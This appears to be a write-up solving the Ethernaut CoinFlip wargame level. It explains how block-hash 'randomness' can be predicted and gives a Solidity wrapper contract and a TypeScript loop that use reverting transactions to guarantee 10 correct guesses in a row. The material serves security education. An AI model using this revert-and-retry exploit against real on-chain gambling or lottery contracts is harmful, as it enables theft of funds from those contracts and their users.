# Solution for Ethernaut Level 03: CoinFlip

## Goal

The goal of this level is to guess the correct outcome of a coin flip 10 times in a row.

## Vulnerability Analysis

The vulnerability lies in the contract's method for generating a "random" number. The outcome of the coin flip depends on the hash of the previous block (`blockhash(block.number - 1)`).

```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    // ...
}
```

A block's hash is a publicly known value on the blockchain. While it may seem random to an external observer, it is a deterministic value that any smart contract can read. This means an attacker can create their own contract to calculate the exact same "random" value in advance and predict the outcome of the flip.

## The Exploit

The provided solution uses a combination of a helper contract (`CoinFlipWrapper.sol`) and an off-chain script (`exploit.ts`) to brute-force the correct guess for each flip.

### The Strategy

The core idea is to try one guess, and if the transaction reverts, we know the other guess must be correct. The helper contract is designed to make the transaction revert if the guess is wrong. This way, we never commit a wrong answer to the `CoinFlip` contract, which would reset our `consecutiveWins`.

### `CoinFlipWrapper.sol`

This simple contract acts as a middleman. Its `onlySuccessFlip` function calls the original `CoinFlip` contract and then immediately checks if the number of consecutive wins has increased. If it hasn't (meaning the guess was wrong and the wins were reset to 0), it reverts the entire transaction.

```solidity
contract CoinFlipWrapper {
    CoinFlip public coinFlip;

    constructor(address _coinFlip) {
        coinFlip = CoinFlip(_coinFlip);
    }

    function onlySuccessFlip(bool guess) public {
        coinFlip.flip(guess);
        // This will revert the transaction if the flip was not successful,
        // preventing `consecutiveWins` from being reset.
        require(coinFlip.consecutiveWins() > 0);
    }
}
```

### `exploit.ts`

The exploit script automates the process. For each flip, it does the following in a loop:

1.  It deploys the `CoinFlipWrapper` contract.
2.  It calls `onlySuccessFlip(true)` inside a `try...catch` block.
3.  If the transaction succeeds, the guess was correct, and it moves to the next flip.
4.  If the transaction fails and is caught by the `catch` block, it means `true` was the wrong guess. The script then immediately calls `onlySuccessFlip(false)`, which is guaranteed to be the correct answer (assuming the block hasn't changed in the meantime).
5.  This loop continues until `consecutiveWins` reaches 10.

```typescript
// A simplified view of the logic in exploit.ts
while (consecutiveWins < 10) {
  let successful = false;
  try {
    // Attempt to guess 'true'
    await coinFlipWrapper.onlySuccessFlip(true);
    successful = true;
  } catch (error) {
    // Transaction reverted, so the guess was wrong.
  }

  if (!successful) {
    // If 'true' failed, 'false' must be correct.
    await coinFlipWrapper.onlySuccessFlip(false);
  }
}
```

This method reliably beats the game by ensuring only successful guesses are ever recorded on the blockchain.